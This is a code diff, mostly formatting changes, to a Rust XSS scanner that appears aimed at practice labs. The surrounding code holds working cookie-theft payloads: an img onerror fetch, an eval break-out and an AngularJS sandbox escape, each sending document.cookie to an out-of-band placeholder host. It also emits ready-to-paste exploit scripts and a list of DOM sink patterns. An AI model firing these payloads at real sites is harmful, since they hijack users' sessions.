@@ -95,7 +95,13 @@ async fn check_search_reflection(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     ];
 
     for (path, param) in endpoints {
-        let Ok(r) = ctx.client.get(ctx.url(path)).query(&[(*param, probe)]).send().await else {
+        let Ok(r) = ctx
+            .client
+            .get(ctx.url(path))
+            .query(&[(*param, probe)])
+            .send()
+            .await
+        else {
             continue;
         };
         let body = r.text().await.unwrap_or_default();
@@ -103,15 +109,16 @@ async fn check_search_reflection(ctx: &Arc<ScanContext>) -> Vec<Finding> {
             let f = Finding::new(
                 Severity::High,
                 "XSS",
-                format!("Search parameter '{param}' reflects unencoded input at {path} — reflected XSS"),
+                format!(
+                    "Search parameter '{param}' reflects unencoded input at {path} — reflected XSS"
+                ),
             );
             ctx.out.finding(&f);
             findings.push(f);
 
             // Emit a ready-to-paste exploit server script for the victim redirect.
             let payload = "<img src=1 onerror=fetch(`OOB/log?c=`+btoa(document.cookie))>";
-            let script_f =
-                exploit_server_script_sq(&ctx.config.base_url, path, param, payload);
+            let script_f = exploit_server_script_sq(&ctx.config.base_url, path, param, payload);
             ctx.out.finding(&script_f);
             findings.push(script_f);
             break;
@@ -387,8 +394,7 @@ async fn check_search_results_js(ctx: &Arc<ScanContext>) -> Vec<Finding> {
         // The eval break-out payload: \\"-fetch(...)// — backslash escapes the server's quote,
         // dash introduces a value expression, fetch exfiltrates cookies, // comments out rest.
         let payload = r#"\\"-fetch(`OOB/log?c=`+btoa(document.cookie))}//"#;
-        let script_f =
-            exploit_server_script_sq(&ctx.config.base_url, "/", "search", payload);
+        let script_f = exploit_server_script_sq(&ctx.config.base_url, "/", "search", payload);
         ctx.out.finding(&script_f);
         findings.push(script_f);
     } else if has_eval {
@@ -422,7 +428,8 @@ async fn check_angularjs_template(ctx: &Arc<ScanContext>) -> Vec<Finding> {
 
     // Secondary signal: angular script include (version detection).
     let version = if let Ok(re) = regex::Regex::new(r"angular[.-](\d+\.\d+\.\d+)(?:\.min)?\.js") {
-        re.captures(&body).and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()))
+        re.captures(&body)
+            .and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()))
     } else {
         None
     };
@@ -444,8 +451,12 @@ async fn check_angularjs_template(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     findings.push(f);
 
     // Probe template expression evaluation via {{7*7}}.
-    let endpoints: &[(&str, &str)] =
-        &[("/search", "search"), ("/search", "q"), ("/", "search"), ("/", "q")];
+    let endpoints: &[(&str, &str)] = &[
+        ("/search", "search"),
+        ("/search", "q"),
+        ("/", "search"),
+        ("/", "q"),
+    ];
     for (path, param) in endpoints {
         let Ok(r2) = ctx
             .client
@@ -472,8 +483,7 @@ async fn check_angularjs_template(ctx: &Arc<ScanContext>) -> Vec<Finding> {
             // location="..." to avoid JS syntax conflicts.
             let ng_payload =
                 "{{$on.constructor('document.location=\"OOB?c=\"+document.cookie')()}}";
-            let script_f =
-                exploit_server_script_dq(&ctx.config.base_url, path, param, ng_payload);
+            let script_f = exploit_server_script_dq(&ctx.config.base_url, path, param, ng_payload);
             ctx.out.finding(&script_f);
             findings.push(script_f);
             break;
@@ -496,8 +506,14 @@ async fn check_js_string_context(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     let mut findings = Vec::new();
 
     let probes: &[(&str, &str)] = &[
-        (r#""-rbscp_jsstr-""#, "JS-string double-quote injection context"),
-        (r"\'rbscp_jsstr\'", "JS-string single-quote+backslash injection context"),
+        (
+            r#""-rbscp_jsstr-""#,
+            "JS-string double-quote injection context",
+        ),
+        (
+            r"\'rbscp_jsstr\'",
+            "JS-string single-quote+backslash injection context",
+        ),
         ("${rbscp_tmpl}", "JS template-literal injection context"),
     ];
 
@@ -660,7 +676,8 @@ async fn check_post_message(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     };
     let body = r.text().await.unwrap_or_default();
 
-    if body.contains("addEventListener('message'") || body.contains("addEventListener(\"message\"") {
+    if body.contains("addEventListener('message'") || body.contains("addEventListener(\"message\"")
+    {
         let f = Finding::new(
             Severity::Medium,
             "XSS",
@@ -696,17 +713,44 @@ async fn check_dom_sinks(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     }
 
     let sinks = [
-        ("document.write(",  "document.write() sink — storeId/location.search DOM XSS likely"),
-        ("innerHTML",        "innerHTML sink — unsanitised assignment leads to DOM XSS"),
-        ("eval(",            "eval() sink — check searchResults.js for reflected DOM XSS"),
-        ("location.hash",   "location.hash source — jQuery DOM XSS vector"),
-        ("location.search", "location.search source — feeds document.write / innerHTML"),
-        ("document.URL",    "document.URL source"),
+        (
+            "document.write(",
+            "document.write() sink — storeId/location.search DOM XSS likely",
+        ),
+        (
+            "innerHTML",
+            "innerHTML sink — unsanitised assignment leads to DOM XSS",
+        ),
+        (
+            "eval(",
+            "eval() sink — check searchResults.js for reflected DOM XSS",
+        ),
+        (
+            "location.hash",
+            "location.hash source — jQuery DOM XSS vector",
+        ),
+        (
+            "location.search",
+            "location.search source — feeds document.write / innerHTML",
+        ),
+        ("document.URL", "document.URL source"),
         ("document.referrer", "document.referrer source"),
-        ("window.location", "window.location sink — lastViewedProduct cookie DOM XSS vector"),
-        ("JSON.parse",      "JSON.parse sink — web message DOM XSS if combined with postMessage"),
-        ("URLSearchParams", "URLSearchParams source — DOM XSS if passed to sink"),
-        ("ng-app",          "ng-app directive — `AngularJS` template injection vector"),
+        (
+            "window.location",
+            "window.location sink — lastViewedProduct cookie DOM XSS vector",
+        ),
+        (
+            "JSON.parse",
+            "JSON.parse sink — web message DOM XSS if combined with postMessage",
+        ),
+        (
+            "URLSearchParams",
+            "URLSearchParams source — DOM XSS if passed to sink",
+        ),
+        (
+            "ng-app",
+            "ng-app directive — `AngularJS` template injection vector",
+        ),
     ];
 
     for (pattern, label) in sinks {
@@ -735,7 +779,9 @@ async fn check_oob_xss(ctx: &Arc<ScanContext>) -> Vec<Finding> {
     let Some(ref oob_url) = ctx.config.oob_url else {
         return findings;
     };
-    ctx.out.info(&format!("Sending OOB XSS cookie-steal probes to {oob_url}…"));
+    ctx.out.info(&format!(
+        "Sending OOB XSS cookie-steal probes to {oob_url}…"
+    ));
 
     findings.extend(oob_search_xss(ctx, oob_url).await);
     findings.extend(oob_comment_xss(ctx, oob_url).await);
@@ -899,7 +945,8 @@ async fn oob_comment_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding> 
                     ctx.out.finding(&f);
                     findings.push(f);
                 } else if status.as_u16() == 404 {
-                    ctx.out.warn("OOB comment XSS: /post/comment returned 404 — endpoint absent");
+                    ctx.out
+                        .warn("OOB comment XSS: /post/comment returned 404 — endpoint absent");
                 } else {
                     // 400/403 means the form exists but rejected the submission
                     // (CSRF token missing, required fields, or content filtering).
@@ -1000,7 +1047,9 @@ async fn oob_angularjs_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding
                     "OOB AngularJS XSS: {path}?{param} → HTTP {status}, trying next endpoint"
                 ));
             }
-            Err(e) => ctx.out.warn(&format!("OOB AngularJS XSS probe failed: {e}")),
+            Err(e) => ctx
+                .out
+                .warn(&format!("OOB AngularJS XSS probe failed: {e}")),
         }
     }
     findings
